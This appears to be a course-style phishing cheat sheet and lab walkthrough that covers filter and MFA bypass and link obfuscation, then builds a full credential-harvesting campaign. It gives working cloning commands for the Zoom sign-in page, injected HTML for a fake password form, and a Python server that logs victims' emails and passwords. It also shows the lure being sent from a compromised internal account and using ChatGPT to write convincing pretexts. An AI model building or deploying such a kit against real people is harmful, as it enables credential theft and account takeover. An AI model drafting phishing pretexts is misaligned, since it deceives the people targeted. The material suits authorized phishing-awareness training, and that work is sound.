# Phishing Basics - Cheat Sheet & Walkthrough

## Table of Contents
1. [Phishing Fundamentals](#1-phishing-fundamentals)
2. [Phishing Payloads & Delivery](#2-phishing-payloads--delivery)
3. [Credential Phishing Campaign](#3-credential-phishing-campaign)
4. [Quick Reference](#4-quick-reference)

---

## 1. Phishing Fundamentals

### What is Phishing?
> The practice of sending fraudulent communications that appear to come from a reputable source, designed to steal sensitive information.

### Phishing Campaign Process
```
1. Research & Reconnaissance
         ↓
2. Pretext Development
         ↓
3. Payload Creation
         ↓
4. Delivery (Email/Messages)
         ↓
5. Capture & Exploitation
         ↓
6. Post-Exploitation
```

---

### 1.1 Email Filtering & Defenses

#### Inbound Email Filters
| Defense | How It Works | Bypass Considerations |
|---------|--------------|---------------------|
| **Domain Reputation** | Checks sender domain reputation | Use reputable/known domains |
| **Attachment Scanning** | Scans files for malicious content | Use less-scrutinized file types |
| **SPF/DKIM/DMARC** | Validates email authenticity | Use compromised legitimate accounts |
| **External Tagging** | Adds `[EXTERNAL]` to emails | Compromise internal accounts |

#### Reputation Block Lists
- Email filtering products use RBLs
- Domain age matters (older = better)
- New domains are more suspicious

#### File Types Most Scrutinized
| High Risk | Medium Risk | Low Risk |
|-----------|-------------|----------|
| `.exe` | `.doc` / `.docx` | `.txt` |
| `.scr` | `.pdf` | `.jpg` / `.png` |
| `.js` | `.zip` / `.rar` | `.html` |
| `.vbs` | `.xls` / `.xlsx` | `.csv` |

---

### 1.2 Microsoft Office Macros

#### What Are Office Macros?
- Scripts written in **Visual Basic for Applications (VBA)**
- Enable automation in Office documents
- Can execute arbitrary code

#### Security Features
| Feature | Purpose | Effectiveness |
|---------|---------|---------------|
| **Disabled by Default** | Macros won't run unless enabled | User must enable |
| **Protected View** | Opens downloaded files in read-only mode | Prevents auto-execution |
| **Mark of the Web (MotW)** | File attribute for downloaded files | Flags untrusted content |
| **Block Macros by Default** | Microsoft blocks macros from internet | Very effective |

#### Mark of the Web (MotW)
```
Zone.Identifier file stored alongside downloaded files
Example: [ZoneTransfer]
ZoneId=3  # Internet zone
```

#### Macro Bypass Techniques
1. **Exploit vulnerabilities** (CVE-2017-11882, CVE-2023-21716)
2. **Use older Office versions** (pre-2016)
3. **Target misconfigured GPOs**
4. **Use alternative file formats** (RTF)

---

### 1.3 Malicious Files & Exploits

#### Common Exploitable File Types
| File Type | Common Vulnerability | Example CVE |
|-----------|---------------------|-------------|
| **Word (.doc/.docx)** | Equation Editor RCE | CVE-2017-11882 |
| **RTF** | RTF Parser RCE | CVE-2023-21716 |
| **PDF** | Use-after-free | CVE-2023-21608 |
| **HTA** | Auto-execution | - |
| **SCR** | Screen saver execution | - |

#### Advanced Attack Vectors
1. **N-day Exploits**: Known vulnerabilities with public PoCs
2. **0-day Exploits**: Unknown vulnerabilities (expensive)
3. **Patch Diffing**: Reverse-engineer patches to find new vulns
4. **Hardware-based**: USB drops, keyloggers, etc.

---

### 1.4 Malicious Links

#### Types of Malicious Links

**1. Credential Harvesting**
- Clone legitimate login pages
- Capture username/password
- Redirect to real site

**2. Browser Exploits**
- Drive-by downloads
- 0-day/N-day exploitation
- Requires vulnerable browser

**3. CSRF Exploits**
- Force actions on authenticated services
- Example: Creating admin accounts
- Requires active session

**4. NTLM Hash Capture**
- Request authentication to SMB server
- Capture NetNTLMv2 hash
- Legacy but still works

#### Link Obfuscation Techniques

| Technique | Description | Example |
|-----------|-------------|---------|
| **URL Shortener** | Hide real URL | `https://bit.ly/xyz123` |
| **Homograph Attack** | Use visually similar characters | `аррӏе.com` vs `apple.com` |
| **Subdomain Trick** | Use subdomain of legitimate site | `login.zoom.us-malicious.com` |
| **Redirector** | Use legitimate redirects | `https://google.com/url?q=malicious` |
| **Typosquatting** | Common misspellings | `zo0m.us` vs `zoom.us` |

#### Password Manager Threats
- Some browser extensions vulnerable
- Credential auto-fill can be exploited
- Android WebView attacks (AutoSpill)

---

### 1.5 MFA Bypass Techniques

#### MFA Types
| Type | Example | Vulnerability |
|------|---------|---------------|
| **SMS** | Text message code | SIM swapping |
| **App Push** | Duo, Microsoft Authenticator | MFA fatigue |
| **App TOTP** | Google Authenticator | Session stealing |
| **Hardware Token** | YubiKey | Physical access |

#### Bypass Methods

**1. MFA Fatigue (Prompt Bombing)**
- Send multiple MFA requests
- User gets annoyed
- Eventually approves one

**2. Session Theft**
- Capture MFA token during login
- Immediate reuse (short window)
- Requires fast relay

**3. Browser-in-the-Middle (BitM)**
```
Target → Malicious Proxy → Real Service
       (Session Hijacked)
```
- Tools: cuddlephish, evilginx2
- Requires public IP
- Steals session cookies

**4. Social Engineering**
- Call target as IT support
- Ask for MFA code
- Requires good pretext

**5. Brute Force**
- Guess 6-digit TOTP
- Typically 1,000,000 possibilities
- Often rate-limited

---

## 2. Phishing Payloads & Delivery

### 2.1 Payload Types

| Payload Type | Description | Example |
|--------------|-------------|---------|
| **Credential Theft** | Steal username/password | Clone of Zoom login |
| **Remote Access Tool** | Establish persistent access | Cobalt Strike beacon |
| **Data Exfiltration** | Steal sensitive data | Macro that sends files |
| **Ransomware** | Encrypt files for ransom | LockBit |
| **Initial Access** | Entry point for further attacks | Reverse shell |

---

### 2.2 Delivery Methods

**1. Email (Most Common)**
```
Pros: Direct, scalable, easy tracking
Cons: Filtering, user awareness
```

**2. SMS (Smishing)**
```
Pros: High open rate
Cons: Short messages, limited content
```

**3. Voice (Vishing)**
```
Pros: High trust, bypasses filters
Cons: Requires speaking skills, time-consuming
```

**4. Social Media**
```
Pros: Personal connection
Cons: Platform limitations
```

**5. Physical (USB Drops)**
```
Pros: Bypasses email filters
Cons: Low success rate, physical presence
```

---

## 3. Credential Phishing Campaign

### 3.1 Pretext Development

#### Steps
1. **Compromise low-privilege account**
   - Public password leaks
   - Initial access

2. **Reconnaissance**
   - Read sent emails
   - Identify communication patterns
   - Learn organizational structure

3. **LLM-Assisted Writing**
   - Feed example emails to ChatGPT
   - Request similar style
   - Generate convincing pretext

#### Example Pretext: Zoom License Update
```
Original email:
"Hello Sales department, Hope you're knocking it out of the park this week!
We're trying to redo our inventory of Zoom licenses..."

LLM-Generated reply:
"Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,
Just a quick reminder—hope everything's going smoothly on your end!
We're still working on updating our Zoom license inventory..."
```

---

### 3.2 Website Cloning

#### Tools & Commands

**1. wget (Flat Structure)**
```bash
wget -E -k -K -p -e robots=off -nd "https://zoom.us/signin#/login"
```

**Flags Explained**:
| Flag | Purpose |
|------|---------|
| `-E` | Change extension to match MIME |
| `-k` | Convert links to local |
| `-K` | Save original with .orig |
| `-p` | Download page prerequisites |
| `-e robots=off` | Ignore robots.txt |
| `-nd` | No directory structure |

**2. SingleFile CLI** (Better for SPAs)
```bash
# Install
sudo apt install nodejs npm chromium -y
sudo npm install -g single-file-cli

# Clone site
single-file "https://zoom.us/signin" signin.html --browser-executable-path /usr/bin/chromium
```

#### HTML Modification Script

```python
import re
from bs4 import BeautifulSoup

# Remove broken elements by ID
for elem_id in ["onetrust-consent-sdk", "onetrust-banner-sdk"]:
    elem = soup.find(id=elem_id)
    if elem:
        elem.decompose()

# Wire up Next button
html = html.replace(
    'id="signin_btn_next"',
    'id="signin_btn_next" onclick="goToPassword()"'
)

# Add Enter key support
html = html.replace(
    'id="email" maxlength="128"',
    'id="email" maxlength="128" onkeydown="if(event.key===\'Enter\'){event.preventDefault();goToPassword();}"'
)
```

#### Password Overlay Injection
```html
<div id="pw-overlay" style="display:none;">
    <form action="http://127.0.0.1:8080/creds" method="POST">
        <input type="hidden" id="hidden-email" name="email">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Sign in</button>
    </form>
</div>

<script>
function goToPassword(){
    var e = document.getElementById('email').value;
    document.getElementById('show-email').textContent = e;
    document.getElementById('pw-overlay').style.display = 'block';
}
</script>
```

---

### 3.3 Credential Capture Server

#### Python Server
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode()
        data = parse_qs(raw)
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]
        print(f'[+] Email: {email}\n[+] Password: {password}')
        
        # Redirect to real site
        self.send_response(302)
        self.send_header('Location', 'https://zoom.us/signin')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```

#### Running the Services
```bash
# Terminal 1: Credential Server
python3 cred_server.py

# Terminal 2: Web Server
sudo python3 -m http.server 80
```

---

### 3.4 Crafting & Sending Phishing Email

#### Webmail Access
```
URL: http://192.168.X.77/mail/
Username: helpdesk@mail.corp.com
Password: Helpdesk@Password2024
```

#### Steps
1. Login as compromised account
2. Go to Sent folder
3. Click "Reply to sender and all recipients"
4. Use LLM-generated email text
5. Switch to HTML mode
6. Insert hyperlink to cloned site
7. Send email

#### Example Hyperlink
```html
<a href="http://192.168.X.Y/signin.html">click here</a>
```

---

### 3.5 Credential Harvesting

#### Victim Flow
1. Victim receives email
2. Clicks malicious link
3. Enters email on cloned page
4. Enters password
5. Credentials sent to server
6. Redirected to real site

#### Captured Output
```
[+] Raw data: email=j.smith.sales%40corp.com&password=W00tw00t%21%21
[+] Captured credentials!
    Email:    j.smith.sales@corp.com
    Password: W00tw00t!!
```

---

## 4. Quick Reference

### Common Commands

#### Website Cloning
```bash
# wget clone
wget -E -k -K -p -e robots=off -nd "https://example.com"

# SingleFile CLI
single-file "https://example.com" page.html --browser-executable-path /usr/bin/chromium

# Start web server
sudo python3 -m http.server 80
```

#### Credential Capture
```bash
# Start credential server
python3 cred_server.py

# Test capture
curl -X POST http://127.0.0.1:8080/creds -d "email=test&password=test"
```

### Tools Quick Reference

| Tool | Purpose | Command |
|------|---------|---------|
| **wget** | Clone websites | `wget -E -k -p -nd URL` |
| **SingleFile CLI** | Clone SPAs | `single-file URL page.html` |
| **Python http.server** | Serve page | `python3 -m http.server 80` |
| **Python script** | Capture creds | `python3 cred_server.py` |
| **ChatGPT** | Generate pretext | Web interface |
| **curl** | Test endpoints | `curl -X POST URL` |

---

### Phishing Campaign Checklist

#### Pre-Phishing
- [ ] Research target organization
- [ ] Compromise initial email account
- [ ] Analyze communication patterns
- [ ] Generate pretext (LLM assistance)
- [ ] Clone legitimate website
- [ ] Modify clone for credential capture
- [ ] Set up credential server
- [ ] Test full flow locally

#### Phishing
- [ ] Login as compromised account
- [ ] Insert phishing email text
- [ ] Add malicious hyperlink
- [ ] Send to targets
- [ ] Monitor credential server

#### Post-Phishing
- [ ] Collect captured credentials
- [ ] Attempt credential reuse
- [ ] Expand access
- [ ] Document findings

---

### Defensive Countermeasures

| Attack Vector | Defense |
|---------------|---------|
| Credential Phishing | MFA, Password Managers |
| Malicious Links | URL filtering, Email Security |
| Office Macros | Disable macros, Group Policy |
| Email Spoofing | SPF, DKIM, DMARC |
| Malicious Attachments | AV Scanning, Sandboxing |
| MFA Bypass | Hardware tokens, AI detection |

---

### MFA Bypass Techniques Summary

| Technique | Difficulty | Success Rate | Detection Risk |
|-----------|------------|--------------|----------------|
| MFA Fatigue | Low | Medium | High |
| Session Theft | Medium | High | Medium |
| Browser-in-Middle | High | High | Low |
| Social Engineering | Medium | Medium | High |
| Brute Force | High | Very Low | Very High |

---

### Key Takeaways

| Concept               | Key Point                                               |
| --------------------- | ------------------------------------------------------- |
| **Pretext**           | Use LLMs to mimic organization's communication style    |
| **Website Clone**     | Use SingleFile for SPAs; wget for static sites          |
| **Cookie Banners**    | Critical for authenticity; replace with working version |
| **Two-Step Flow**     | Mimic real service (email then password)                |
| **Credential Server** | Post to server; redirect to real site                   |
| **Delivery**          | Use compromised internal account to bypass filters      |
| **MFA**               | Multiple bypass techniques exist                        |